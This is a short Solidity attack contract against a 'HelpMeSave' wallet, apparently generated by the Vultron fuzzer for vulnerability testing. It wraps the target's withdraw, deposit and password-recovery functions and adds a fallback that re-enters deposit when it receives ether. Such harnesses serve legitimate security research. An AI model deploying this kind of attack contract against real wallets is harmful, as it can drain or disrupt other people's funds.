pragma solidity ^0.4.19;

import "./HelpMeSave.sol";

contract Attack_HelpMeSave2 {

  HelpMeSave public target_contract;

  function Attack_HelpMeSave2(address _targetContract) public payable {
      target_contract = HelpMeSave(_targetContract);
  } 

  function vultron_MyTestWallet7() public {
    target_contract.MyTestWallet7();
  } 

  function vultron_withdraw() public {
    target_contract.withdraw();
  } 

  function vultron_recovery(string _password, address _return_addr) public {
    target_contract.recovery(_password, _return_addr);
  } 

  function vultron_deposit(uint256 vultron_amount) public payable{
    target_contract.deposit.value(vultron_amount)();
  } 

      function() public payable {
        
        target_contract.deposit();
      }
      } 
